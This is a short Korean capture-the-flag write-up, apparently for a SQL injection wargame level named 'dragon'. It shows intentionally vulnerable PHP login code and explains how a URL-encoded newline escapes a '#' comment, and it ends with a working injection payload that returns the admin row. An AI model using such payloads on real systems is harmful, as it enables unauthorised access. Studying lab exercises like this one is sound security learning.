# dragon

## 1. Code
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_dragon where id='guest'# and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("dragon");
  highlight_file(__FILE__); 
?>
```

## 2. Condition
- 쿼리에서 `id='guest'` 이후부터 주석처리한다.
- `id` 가 admin이면 문제가 해결된다.


## 3. Solution

쿼리에서 사용된 `#`은 한줄주석이다.<br>
그말은 즉, `%0a` 개행을 이용하면 쉽게 해결된다.<br>

변수명 | 값
---|---:
`pw` | `'%0aand pw='1234' or id='admin`
